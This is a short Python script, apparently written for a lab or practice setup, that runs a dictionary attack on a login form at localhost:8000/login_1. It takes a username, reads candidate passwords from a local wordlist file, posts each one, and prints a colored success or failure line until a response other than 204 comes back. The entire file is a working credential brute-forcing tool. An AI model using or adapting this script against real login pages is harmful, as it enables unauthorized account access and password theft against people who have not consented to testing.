
import requests
from termcolor import colored, cprint


# dictionary attack on a particular username
def attack(username):
	# attack route
	url = 'http://localhost:8000/login_1'

	# load seclist password file
	passwords = [line.strip() for line in open('passwords', 'r')]

	# test each password
	i = 0
	for p in passwords:
		# create login data form
		data = {
			'username' : username,
			'password' : p,
		}

		# send & read request
		response = requests.post(url, data=data)

		# output attempt log
		if response.status_code != 204:
			c = '[' + colored('Success', 'green', attrs = ['bold', 'blink']) + ']'
			print(f'\n{c} : {username, p}')
			# print(response.content)
			break
		else:
			c = '[' + colored(f'Failed {i}', 'red', attrs = ['bold']) + ']'
			print(f'{c} : {username, p}')	

		i += 1		

# start script
user = input('Username: ')
attack(user)
